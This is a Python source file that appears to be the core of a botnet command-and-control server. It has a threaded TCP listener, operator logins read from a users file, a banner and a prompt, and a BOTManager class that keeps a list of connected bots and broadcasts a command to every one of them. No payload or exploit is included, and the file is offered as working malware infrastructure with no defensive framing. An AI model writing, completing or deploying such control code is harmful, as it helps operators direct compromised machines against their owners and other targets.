from socket import socket
from threading import Thread

BANNER = open(
    'files/banner.txt',
    'rb'
).read()

PROMPT = open(
    'files/prompt.txt',
    'rb'
).read()

USERS = []

with open('files/users.txt', 'r') as f:
    for line in f.readlines():

        if line.count(':') != 1:
            continue
        else:
            USERS.append(line.split(':'))

class HandlerSocket:

    def __init__(self, sock: socket, sockAddr: tuple) -> None:
        self.sock = sock
        self.sockAddr = sockAddr
    
    def recvRaw(self, escape: bool = True) -> bytes:
        buff = b''

        while 1:
            buff += self.sock.recv(1024)
            
            if not escape:
                return buff

            if not buff or b'\r\n' in buff:
                return buff
    
    def recv(self, escape: bool = True) -> str:
        return self.recvRaw(escape).decode('utf-8')
    
    def sendRaw(self, buff: bytes) -> int:
        return self.sock.send(buff)

    def send(self, buff: str) -> int:
        return self.sendRaw(buff.encode('utf-8'))
    
    def setTimeout(self, value: float | None = None) -> None:
        self.sock.settimeout(value)
    
    def setIdleTimeout(self) -> None:
        self.setTimeout(200)
    
    def setLoginTimeout(self) -> None:
        self.setTimeout(60)
    
    def close(self) -> None:
        self.sock.close()
    
    def clearTerminal(self) -> int:
        return self.send('\033[2J\033[H')
    
    def handler(self) -> None:
        return

    def run(self) -> None:
        Thread(
            target=self.handler,
            daemon=True
        ).start()

class ServerSocket:

    def __init__(self, addr: str, port: int, handler: HandlerSocket) -> None:
        self.addr = addr
        self.port = port
        self.handler = handler

    def listener(self) -> None:
        s = socket()
        s.bind((self.addr, self.port))
        s.listen()

        while 1:
            h = self.handler(*s.accept())
            h.run()

    def run(self) -> None:
        Thread(
            target=self.listener,
            daemon=True
        ).start()

class BOTManagerT:
    listeners: list[HandlerSocket] = None

    def __init__(self) -> None:
        self.listeners = []
    
    def add(self, obj: HandlerSocket) -> None:
        if obj not in self.listeners:
            self.listeners.append(obj)
    
    def remove(self, obj: HandlerSocket) -> None:
        if obj in self.listeners:
            self.listeners.remove(obj)
    
    def command(self, buff: str) -> None:
        for bot in self.listeners:
            try:
                bot.send(buff)
            except Exception:
                self.remove(bot)
                
    def getBots(self) -> list[HandlerSocket]:
        return self.listeners

BOTManager = BOTManagerT()